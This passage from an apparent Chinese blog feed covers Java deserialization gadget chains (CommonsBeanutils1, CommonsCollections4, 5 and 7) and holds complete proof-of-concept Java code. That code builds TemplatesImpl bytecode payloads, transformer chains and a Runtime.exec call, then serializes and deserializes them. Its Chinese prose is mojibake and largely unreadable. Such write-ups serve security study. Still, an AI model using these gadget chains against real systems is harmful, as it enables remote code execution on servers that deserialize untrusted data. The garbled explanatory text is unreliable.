å™¨èƒ½å¤Ÿå¯¹queueè¿›è¡Œåˆå§‹åŒ–ï¼Œå¹¶ä¸”ä¹Ÿèƒ½å¯¹comparatorèµ‹å€¼</p><p><img src="/2022/10/29/CommonsBeanutils1/8.png"></p><p>æ‰€ä»¥ï¼Œæ›´æ”¹poc</p><h4 id="é—®é¢˜ç‚¹2"><a href="#é—®é¢˜ç‚¹2" class="headerlink" title="é—®é¢˜ç‚¹2"></a>é—®é¢˜ç‚¹2</h4><p>sizeçš„å€¼ï¼Œéœ€è¦å’Œqueue.sizeç›¸åŒå¤§å°ï¼Œè¿™æ˜¯å› ä¸ºåœ¨writeObjectè¿‡ç¨‹ä¸­æœ‰ä¸ªforå¾ªç¯</p><p><img src="/2022/10/29/CommonsBeanutils1/9.png"></p><p>æ‰€ä»¥pocæ”¹ä¸ºå¦‚ä¸‹æƒ…å†µ</p><h4 id="é—®é¢˜ç‚¹3"><a href="#é—®é¢˜ç‚¹3" class="headerlink" title="é—®é¢˜ç‚¹3"></a>é—®é¢˜ç‚¹3</h4><p>sizeæœ€å°è¦ä¸º2ï¼Œå…¶åŸå› å¦‚ä¸‹</p><p><img src="/2022/10/29/CommonsBeanutils1/10.png"></p><p>æ‰€ä»¥ç›®å‰çš„pocå¦‚ä¸‹</p><p><img src="/2022/10/29/CommonsBeanutils1/11.png"></p><h4 id="é—®é¢˜ç‚¹4"><a href="#é—®é¢˜ç‚¹4" class="headerlink" title="é—®é¢˜ç‚¹4"></a>é—®é¢˜ç‚¹4</h4><p>åœ¨åˆ›å»º<code>BeanComparator</code>æ—¶ï¼Œä¼ å…¥çš„æ˜¯ 111 , å®é™…ä¸Šè¿™ä¸ªä¼ å…¥çš„å€¼å°±æ˜¯åé¢éœ€è¦æ‰çš„getteræ–¹æ³•åç§°(å»æ‰getteréƒ¨åˆ†)</p><p><img src="/2022/10/29/CommonsBeanutils1/12.png"></p><p>æ‰€ä»¥æ­¤å¤„éœ€è¦å°†111 æ›´æ”¹ä¸º<code>OutputProperties</code></p><h4 id="é—®é¢˜ç‚¹5"><a href="#é—®é¢˜ç‚¹5" class="headerlink" title="é—®é¢˜ç‚¹5"></a>é—®é¢˜ç‚¹5</h4><p>å‰é¢ä¸€ç›´ä»¥ä¸ºæ˜¯è·å–get + nameçš„æ–¹æ³•ï¼Œå®é™…ä¸Šnameå…¶å®æ˜¯å±æ€§åï¼Œè€Œä¸æ˜¯ä¸€æ®µå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¦å°†111 æ›´æ”¹ä¸º<code>outputProperties</code></p><p>å…·ä½“åŸå› è§<code>org.apache.commons.beanutils.BeanIntrospectionData#getDescriptor</code></p><p><img src="/2022/10/29/CommonsBeanutils1/13.png"></p><h4 id="é—®é¢˜ç‚¹6"><a href="#é—®é¢˜ç‚¹6" class="headerlink" title="é—®é¢˜ç‚¹6"></a>é—®é¢˜ç‚¹6</h4><p>å…³äºqueueæ•°ç»„ä¸¤ä¸ªå€¼çš„é—®é¢˜ï¼Œæ™šä¸Šç»™çš„æ˜¯ä¸¤ä¸ªå€¼éƒ½ä¼ <code>templates</code>ï¼Œå…¶å®åªéœ€<code>queue[0]=templates</code>å³å¯</p><p>å…¶åŸå› æ˜¯</p><p><img src="/2022/10/29/CommonsBeanutils1/14.png"></p><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>æœ€ç»ˆpocå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>    TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>    Class&lt;TemplatesImpl&gt; templatesClass = TemplatesImpl.class;<br>    Field name = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>    name.setAccessible(<span class="hljs-keyword">true</span>);<br>    name.set(templates,<span class="hljs-string">&quot;zzz&quot;</span>);<br><br>    Field bytecodes = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>    bytecodes.setAccessible(<span class="hljs-keyword">true</span>);<br>    <span class="hljs-keyword">byte</span>[][] b = &#123;classBytes()&#125;;<br>    bytecodes.set(templates,b);<br><br>    BeanComparator&lt;Object&gt; comparator = <span class="hljs-keyword">new</span> BeanComparator&lt;&gt;(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>    PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> PriorityQueue&lt;&gt;(<span class="hljs-number">2</span>,comparator);<br><br>    Field queues = queue.getClass().getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>    queues.setAccessible(<span class="hljs-keyword">true</span>);<br>    Object[] queueArray = (Object[])queues.get(queue);<br>    queueArray[<span class="hljs-number">0</span>] = templates;<br>    queueArray[<span class="hljs-number">1</span>] = <span class="hljs-keyword">null</span>;<br><br>    Field size = queue.getClass().getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>    size.setAccessible(<span class="hljs-keyword">true</span>);<br>    size.set(queue,<span class="hljs-number">2</span>);<br><br>    serialize(queue);<br>    deserialize();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03 æ€»ç»“"></a>0x03 æ€»ç»“</h3><p>CBé“¾è¯´åˆ°åº•åªæ˜¯åˆæä¾›äº†ä¸€æ¡è·¯å­ï¼Œå…¶ä¸­æœ€é‡è¦çš„æ˜¯<code>org.apache.commons.beanutils.PropertyUtilsBean#getSimpleProperty</code>å¯ä»¥è°ƒç”¨ä»»æ„ç±»ä¸­å±æ€§çš„getæ–¹æ³•ï¼Œç„¶ååœ¨<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties</code>ä¸­åˆè°ƒç”¨äº†<code>newTransformer</code>,å…¥å£ç‚¹è¿˜æ˜¯CCä¸­çš„ä¸€ä¸ªï¼Œåªä¸è¿‡ä¸­é—´èµ°çš„è·¯å­å˜äº†</p><p><img src="/2022/10/29/CommonsBeanutils1/15.png"></p><h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul><li><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsBeanutils1.java">ysoserial_CommonsBeanutils1</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Javaå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsCollections4ã€5ã€7</title>
    <link href="/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/"/>
    <url>/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/</url>
    
    <content type="html"><![CDATA[<h2 id="CommonsCollections4-5-7"><a href="#CommonsCollections4-5-7" class="headerlink" title="CommonsCollections4+5+7"></a>CommonsCollections4+5+7</h2><h3 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h3><p>CCè¿™å‡ æ¡é“¾åŸºæœ¬ä¸Šå¿«çœ‹å®Œäº†ï¼Œåé¢çš„å…¶å®ä¹Ÿå°±æ˜¯ä¸€äº›æ–°çš„è°ƒç”¨é“¾ï¼Œæ‰€ä»¥å°±æ‡’å¾—åˆ†å¼€å†™äº†ï¼Œç›´æ¥æ”¾åœ¨ä¸€èµ·äº†</p><h3 id="0x01-CommonsCollections4"><a href="#0x01-CommonsCollections4" class="headerlink" title="0x01 CommonsCollections4"></a>0x01 CommonsCollections4</h3><p>è¿™æ¡é“¾æ˜¯CC2çš„ä¸€ä¸ªå˜ä½“ï¼Œå°†<code>org.apache.commons.collections4.functors.InvokerTransformer</code>æ›¿æ¢ä¸º<code>org.apache.commons.collections4.functors.InstantiateTransformer</code>ï¼Œåœ¨ä»¥å‰çš„æ–‡ç« ä¸­å·²ç»è¯´è¿‡äº†</p><p>å¦å¤–å°±æ˜¯åˆæ¢äº†ä¸€äº›è·¯å­ï¼Œæ‰¾åˆ°äº†ä¸€äº›æ–°çš„è·¯å­ï¼Œæ‰¾</p><p>jdk8u71ã€jdk8u341</p><p>CommonsCollections4.0</p><p>å…ˆæ¥çœ‹ä¸€ä¸‹å¤§ä½¬çš„è·¯å­ï¼Œå¤§ä½¬æ²¡å†™è·¯å­ï¼Œå¯„ğŸ˜£</p><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>è¿™ä¸ªè·ŸCC2æ”¹ç›¸æ¯”ï¼Œæ”¹åŠ¨çš„åœ°æ–¹ä¹Ÿä¸å¤š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>    TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>    Class&lt;TemplatesImpl&gt; templatesClass = TemplatesImpl.class;<br>    Field name = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>    name.setAccessible(<span class="hljs-keyword">true</span>);<br>    name.set(templates,<span class="hljs-string">&quot;zzz&quot;</span>);<br><br>    Field bytecodes = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>    bytecodes.setAccessible(<span class="hljs-keyword">true</span>);<br>    <span class="hljs-keyword">byte</span>[][] b = &#123;classBytes()&#125;;<br>    bytecodes.set(templates,b);<br><br>    InstantiateTransformer instantiateTransformer = <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;templates&#125;);<br><br>    ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>        <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>        instantiateTransformer<br>    &#125;);<br><br>    TransformingComparator&lt;Object, Object&gt; transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator&lt;Object, Object&gt;(chainedTransformer);<br><br>    PriorityQueue&lt;Object&gt; objects = <span class="hljs-keyword">new</span> PriorityQueue&lt;&gt;(transformingComparator);<br><br>    Class&lt;? extends PriorityQueue&gt; c = objects.getClass();<br>    Field size = c.getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>    size.setAccessible(<span class="hljs-keyword">true</span>);<br>    size.set(objects,<span class="hljs-number">2</span>);<br><br>    serialize(objects);<br>    deserialize();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="0x02-CommonsCollections5"><a href="#0x02-CommonsCollections5" class="headerlink" title="0x02 CommonsCollections5"></a>0x02 CommonsCollections5</h3><p>CC5ï¼Œæ‰¾äº†ä¸€ä¸ªæ–°çš„å…¥å£ç‚¹ï¼Œä»LazyMapä¹‹å‰æœ‰æ‰€å˜åŠ¨ï¼Œå…¶ä½™çš„æ²¡ä»€ä¹ˆå˜åŒ–ï¼Œä¸»è¦æ˜¯æ¥çœ‹ä¸€ä¸‹å‰é¢çš„å˜åŠ¨</p><h4 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h4><p>jdk8u71</p><p>CommonsCollections4.0</p><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p><img src="/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/1.png"></p><p>ä¸Šé¢è¯´åªé€‚ç”¨äºJDK 8u76ï¼Œä¸”æ²¡æœ‰å®‰å…¨ç®¡ç†å™¨ï¼Œemmmï¼Œæš‚æ—¶è¿˜æ²¡æœ‰JDK8u76å‘¢ï¼Œå…ˆåœ¨ä»¥å‰çš„ç‰ˆæœ¬è¯•ä¸€ä¸‹å§</p><p>å…ˆæ¥çœ‹ä¸€ä¸‹è¿™ä¸ª<code>org.apache.commons.collections.keyvalue.TiedMapEntry#toString</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> getKey() + <span class="hljs-string">&quot;=&quot;</span> + getValue();<br>&#125;<br><span class="hljs-comment">// ä¸Šé¢çŸ¥é“getValueä¸­ä¼šè°ƒç”¨map.getï¼Œæ‰¾åˆ°ä¸€ä¸ªç‚¹è°ƒTiedMapEntry#toStringå°±å¥½äº†</span><br><span class="hljs-comment">// ä¸è¿‡æ‰toStringçš„åœ°æ–¹å®åœ¨å¤ªå¤šäº†ï¼Œç›´æ¥æ¥çœ‹å®˜æ–¹çš„å§</span><br></code></pre></td></tr></table></figure><h5 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// è™½ç„¶è¯¥ç±»æ²¡æœ‰å®ç°åºåˆ—åŒ–æ¥å£ï¼Œä½†Exceptionå®ç°äº†ï¼Œæ‰€ä»¥éƒ½ä¸€æ ·</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BadAttributeValueExpException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Exception</span> </span>&#123;<br>    <br>    <span class="hljs-keyword">private</span> Object val;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">BadAttributeValueExpException</span> <span class="hljs-params">(Object val)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.val = val == <span class="hljs-keyword">null</span> ? <span class="hljs-keyword">null</span> : val.toString();<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        ObjectInputStream.GetField gf = ois.readFields();<br>        Object valObj = gf.get(<span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-keyword">null</span>);<br><br>        <span class="hljs-keyword">if</span> (valObj == <span class="hljs-keyword">null</span>) &#123;<br>            val = <span class="hljs-keyword">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (valObj <span class="hljs-keyword">instanceof</span> String) &#123;<br>            val= valObj;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-keyword">null</span><br>                || valObj <span class="hljs-keyword">instanceof</span> Long<br>                || valObj <span class="hljs-keyword">instanceof</span> Integer<br>                || valObj <span class="hljs-keyword">instanceof</span> Float<br>                || valObj <span class="hljs-keyword">instanceof</span> Double<br>                || valObj <span class="hljs-keyword">instanceof</span> Byte<br>                || valObj <span class="hljs-keyword">instanceof</span> Short<br>                || valObj <span class="hljs-keyword">instanceof</span> Boolean) &#123;<br>            val = valObj.toString();<span class="hljs-comment">// è¿™é‡Œè°ƒç”¨äº†toStringï¼Œå¹¶ä¸”valObjå¯æ§</span><br>        &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// the serialized object is from a version without JDK-8019292 fix</span><br>            val = System.identityHashCode(valObj) + <span class="hljs-string">&quot;@&quot;</span> + valObj.getClass().getName();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>BadAttributeValueExpException#readObject-&gt;TiedMapEntry#toString-&gt;LazyMap.get</p><h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼š</p><ul><li><p>æ‹¼æ¥ä»£ç çš„æ—¶å€™åˆ«æ‹¼é”™äº†ï¼Œæ€è·¯è¦æ¸…æ™°</p></li><li><p>æ³¨æ„æŠŠIDEAè°ƒè¯•æ—¶è‡ªåŠ¨è°ƒç”¨toStringå…³æ‰ï¼Œè°ƒå®Œå†å¼€</p><p><img src="/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/2.png"></p></li></ul><p>ç„¶åå°±æ²¡å•¥äº†æ‹¼æ¥ä¸€ä¸‹è·¯å­å°±å¯ä»¥äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>    ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>        <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;Runtime.class,<span class="hljs-keyword">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>    &#125;);<br><br>    HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    <span class="hljs-comment">// å…ˆä¼ ä¸ªæ²¡å•¥ç”¨çš„ï¼Œåé¢å†æ”¹</span><br>    Map lazyMap = LazyMap.decorate(map,<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-string">&quot;q&quot;</span>));<br><br>    TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(lazyMap, <span class="hljs-string">&quot;111&quot;</span>);<br><br>    Class aClass = LazyMap.class;<br>    Field factory = aClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>    factory.setAccessible(<span class="hljs-keyword">true</span>);<br>    factory.set(lazyMap,chainedTransformer);<br><br>    <span class="hljs-comment">// å› ä¸ºåœ¨æ„é€ å™¨æ—¶ä¹Ÿä¼šæ‰toStringï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯å…ˆé€ ä¸ªæ²¡å•¥ç”¨çš„TiedMapEntryï¼Œåé¢å†åå°„æŠŠæœ‰ç”¨çš„æ›¿æ¢è¿›å»</span><br>    TiedMapEntry tiedMapEntry1 = <span class="hljs-keyword">new</span> TiedMapEntry(LazyMap.decorate(map, <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-string">&quot;q&quot;</span>)), <span class="hljs-number">222</span>);<br><br>    BadAttributeValueExpException badAttributeValueExpException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(tiedMapEntry1);<br><br>    Field val = badAttributeValueExpException.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>    val.setAccessible(<span class="hljs-keyword">true</span>);<br>    val.set(badAttributeValueExpException,tiedMapEntry);<br><br>    serialize(badAttributeValueExpException);<br>    deserialize();<br>&#125;<br></code></pre></td></tr></table></figure><p>è·¯å­å¤šäº†ä¸€æ¡ï¼Œæ‰€ä»¥å›¾ç‰‡åˆå¯ä»¥æ›´æ–°äº†</p><p><img src="/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/3.png"></p><h3 id="0x03-CommonsCollections7"><a href="#0x03-CommonsCollections7" class="headerlink" title="0x03 CommonsCollections7"></a>0x03 CommonsCollections7</h3><h4 id="ç¯å¢ƒ-1"><a href="#ç¯å¢ƒ-1" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h4><p>jdk8u65ã€jdk8u341</p><p>CommonsCollections4.0</p><p>å…ˆæ¥çœ‹ä¸€ä¸‹å¤§ä½¬çš„ï¼Œå› ä¸ºèœé¸¡çš„æˆ‘çœŸçš„ä¸å¤ªæ˜ç™½è¿™æ˜¯æ€ä¹ˆæ‰¾å‡ºæ¥çš„</p><p><img src="/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/4.png"></p><p>è¿™é‡Œå…¶å®ä¹Ÿå°±æ˜¯å…¥å£ç‚¹ä¸å¤ªä¸€æ ·ï¼Œåˆ°åé¢çš„LazyMapæ—¶å°±ä¸€æ ·</p><p>å…ˆæ¥çœ‹çœ‹ç”¨åˆ°çš„å‡ ä¸ªç±»å’Œæ–¹æ³•</p><h4 id="HashTbale"><a href="#HashTbale" class="headerlink" title="HashTbale"></a><code>HashTbale</code></h4><p><code>Hashtable</code>æ˜¯Javaè¯­è¨€ä¸­çš„ä¸€ä¸ªç±»ï¼Œå®ƒå®ç°äº†ä¸€ä¸ªåŸºäºå“ˆå¸Œè¡¨çš„é”®å€¼å¯¹ï¼ˆkey-valueï¼‰å­˜å‚¨ç»“æ„ã€‚åœ¨è¿™ä¸ªç»“æ„ä¸­ï¼Œæ¯ä¸ªé”®å¯¹åº”ä¸€ä¸ªå€¼ï¼Œå¹¶ä¸”å¯ä»¥ä½¿ç”¨é”®æ¥å¿«é€ŸæŸ¥æ‰¾å¯¹åº”çš„å€¼ã€‚è¯¥ç±»æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œå¯ä»¥åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ä½¿ç”¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hashtable</span>&lt;<span class="hljs-title">K</span>,<span class="hljs-title">V</span>&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title">Dictionary</span>&lt;<span class="hljs-title">K</span>,<span class="hljs-title">V</span>&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title">Map</span>&lt;<span class="hljs-title">K</span>,<span class="hljs-title">V</span>&gt;, <span class="hljs-title">Cloneable</span>, <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">Serializable</span> </span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br><br>        ...<br>        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reconstitutionPut</span><span class="hljs-params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> StreamCorruptedException</span>&#123;<br>        <span class="hljs-keyword">if</span> (value == <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> java.io.StreamCorruptedException();<br>        &#125;<br>        <span class="hljs-comment">// Makes sure the key is not already in the hashtable.</span><br>        <span class="hljs-comment">// This should not happen in deserialized version.</span><br>        <span class="hljs-keyword">int</span> hash = key.hashCode();<br>        <span class="hljs-keyword">int</span> index = (hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % tab.length;<span class="hljs-comment">// å…ˆå–ä¸‹æœ‰ç¬¦å·æ•´æ•°ï¼Œå†å–ä½™</span><br>        <span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-keyword">null</span> ; e = e.next) &#123;<br>            <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<span class="hljs-comment">// è°ƒç”¨è¿™ä¸ªequals</span><br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> java.io.StreamCorruptedException();<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// Creates the new entry.</span><br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];<br>        tab[index] = <span class="hljs-keyword">new</span> Entry&lt;&gt;(hash, key, value, e);<br>        count++;<br>    &#125;<br>        <br>        ...<br>        <span class="hljs-comment">// Read the number of elements and then all the key/value objects</span><br>        <span class="hljs-keyword">for</span> (; elements &gt; <span class="hljs-number">0</span>; elements--) &#123;<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                K key = (K)s.readObject();<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                V value = (V)s.readObject();<br>            <span class="hljs-comment">// synch could be eliminated for performance</span><br>            reconstitutionPut(table, key, value);<span class="hljs-comment">// è·Ÿè¿›è¯¥æ–¹æ³•</span><br>        &#125;<br>    &#125;   <br>&#125;<br></code></pre></td></tr></table></figure><h4 id="AbstractMapDecorator"><a href="#AbstractMapDecorator" class="headerlink" title="AbstractMapDecorator"></a><code>AbstractMapDecorator</code></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 